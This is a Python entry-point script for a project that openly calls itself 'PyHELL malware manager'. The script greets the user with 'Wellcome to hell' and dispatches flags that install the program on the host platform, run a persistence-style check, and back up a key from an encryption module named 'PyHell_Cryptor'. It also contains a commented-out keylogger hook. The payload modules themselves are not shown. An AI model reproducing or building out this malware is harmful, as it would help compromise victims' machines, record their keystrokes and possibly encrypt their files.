import sys

import bin.install
from bin.assets import themes
from bin.security.cryptor.main import PyHell_Cryptor
# from bin import log

if __name__ == "__main__":

    themes.clear_console()
    themes.change_color()
    print(themes.ASCII_LOGO)
    print("Wellcome to hell. PyHELL malware manager")

    if len(sys.argv) > 1:
        if sys.argv[1] == "--install":
            Installer = bin.install.Installer(sys.platform)
        if sys.argv[1] == "--run":
            Checker = bin.install.KeeperCheck(sys.platform)
            # loger = log.run.Keylog()
            # with loger:
            #     pass

        if len(sys.argv) == 3:
            if sys.argv[1] == "--dbg" and sys.argv[2] == "--get-key":
                kgen = PyHell_Cryptor()
                kgen.backup_key()
                print("BACKUP IS DONE")

    else:
        pass



